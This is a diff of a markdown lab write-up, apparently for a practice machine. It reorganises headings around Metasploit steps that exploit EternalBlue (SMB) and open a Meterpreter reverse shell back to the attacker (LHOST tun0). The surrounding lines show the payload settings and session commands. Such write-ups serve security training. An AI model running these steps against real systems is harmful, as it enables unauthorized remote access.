@@ -9,7 +9,9 @@ Machine IP: 10.10.10.40
   - [TCP port #445 safe scripts](#Port-445-Safe-Scripts)
 
 - [Metasploit](#Metasploit)
-  - [Exploit](#Exploit)
+  - [Search Exploit](#Search-Exploit)
+  - [Exploit Options](#Exploit-Options)
+  - [Reverse Shell](#Reverse-Shell)
 
 ## NMAP
 ### TCP All Ports
@@ -106,12 +108,14 @@ Nmap done: 1 IP address (1 host up) scanned in 75.47 seconds
 ---
 
 ## Metasploit
-### Exploit
+### Search Exploit
 ```CSS
 msf6 > search eternalblue
 ```
 ![image](https://user-images.githubusercontent.com/83878909/231924001-a45f3cad-bd2e-4491-814f-2585eccf1cc8.png)
 
+
+### Exploit Options
 ```CSS
 > set payload windows/x64/meterpreter/reverse_tcp
 > set LHOST tun0
@@ -120,6 +124,8 @@ msf6 > search eternalblue
 ```
 ![image](https://user-images.githubusercontent.com/83878909/231933782-b118443d-4573-44f1-92f4-8ba3a78df666.png)
 
+
+### Reverse Shell
 ```CSS
 > sessions -l
 > sessions -i 1
@@ -127,3 +133,7 @@ msf6 > search eternalblue
 meterpreter > shell
 ```
 ![image](https://user-images.githubusercontent.com/83878909/231934200-86eb56b0-d2e9-4841-8c24-4d411716b23e.png)
+
+---
+
+
